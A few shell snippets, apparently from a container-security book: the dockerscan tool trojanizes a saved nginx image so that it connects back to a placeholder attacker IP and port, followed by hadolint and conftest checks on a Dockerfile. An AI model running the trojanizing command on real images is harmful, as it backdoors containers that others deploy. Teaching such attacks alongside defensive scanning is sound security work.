```
$ docker save nginx:latest -o webserver.tar ![1](Images/1.png)
$ dockerscan image modify trojanize webserver.tar \ ![2](Images/2.png)
  --listen "${ATTACKER_IP}" --port "${ATTACKER_PORT}" ![3](Images/3.png)
  --output trojanized-webserver ![4](Images/4.png)
```

```
$ docker run --rm -i hadolint/hadolint < Dockerfile
/dev/stdin:3 DL3008 Pin versions in apt get install.
/dev/stdin:5 DL3020 Use COPY instead of ADD for files and folders
```

```
$ conftest test --policy ./test/policy --all-namespaces Dockerfile
2 tests, 2 passed, 0 warnings, 0 failures, 0 exceptions
```
